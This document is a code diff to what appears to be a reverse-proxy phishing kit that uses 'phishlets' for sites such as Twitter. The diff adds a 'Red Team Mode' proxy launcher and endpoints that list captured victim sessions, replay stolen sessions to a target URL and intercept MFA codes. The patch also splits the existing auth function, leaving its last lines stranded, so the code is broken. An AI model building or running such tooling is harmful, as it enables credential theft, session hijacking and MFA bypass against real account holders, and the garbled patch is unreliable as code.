@@ -48,8 +48,23 @@ class GodModeRunner:
     def start_proxy(self, phishlet="phishlets/twitter.yaml"):
         env = os.environ.copy()
         env["PHISHLET"] = phishlet
-        p = subprocess.Popen([sys.executable, "engine/proxy.py"], env=env)
+        # Use advanced proxy for Red Team operations
+        p = subprocess.Popen([sys.executable, "engine/advanced_proxy.py"], env=env)
         self.processes.append(p)
+    
+    def start_advanced_proxy(self, phishlet="phishlets/twitter.yaml", redteam_domains=""):
+        """Start advanced proxy with Red Team capabilities"""
+        env = os.environ.copy()
+        env["PHISHLET"] = phishlet
+        env["REDTEAM_DOMAINS"] = redteam_domains
+        env["ADVANCED_MODE"] = "true"
+        
+        logger.info("🚀 Starting Advanced Proxy - Red Team Mode")
+        logger.info(f"🎯 Target Domains: {redteam_domains}")
+        
+        p = subprocess.Popen([sys.executable, "engine/advanced_proxy.py"], env=env)
+        self.processes.append(p)
+        return p
     def start_frontend(self):
         cwd = os.path.join(BASE_DIR, "web", "frontend")
         cmd = ["npm.cmd", "start"] if sys.platform.startswith("win") else ["npm", "start"]
@@ -97,6 +112,53 @@ async def auth(provider: str, request: Request):
     if provider not in PHISHLET_URLS:
         raise HTTPException(status_code=404, detail="Provider not supported")
     url = PHISHLET_URLS[provider]
+
+# Red Team Control Endpoints
+@app.get("/redteam/sessions")
+async def get_sessions():
+    """Get all captured sessions"""
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.get("http://127.0.0.1:8080/_/sessions")
+            return response.json()
+    except Exception as e:
+        return {"error": str(e)}
+
+@app.get("/redteam/session/{session_id}")
+async def get_session(session_id: str):
+    """Get specific session details"""
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.get(f"http://127.0.0.1:8080/_/session/{session_id}")
+            return response.json()
+    except Exception as e:
+        return {"error": str(e)}
+
+@app.post("/redteam/replay/{session_id}")
+async def replay_session(session_id: str, target_url: str):
+    """Replay captured session to target URL"""
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.post(
+                f"http://127.0.0.1:8080/_/session/replay/{session_id}",
+                params={"target_url": target_url}
+            )
+            return response.json()
+    except Exception as e:
+        return {"error": str(e)}
+
+@app.post("/redteam/mfa/intercept")
+async def intercept_mfa(content: str):
+    """Intercept MFA codes from content"""
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.post(
+                "http://127.0.0.1:8080/_/mfa/intercept",
+                json={"content": content, "content_type": "text/plain"}
+            )
+            return response.json()
+    except Exception as e:
+        return {"error": str(e)}
     logger.info(f"{ip} -> {provider.upper()}")
     return RedirectResponse(url=url)
 
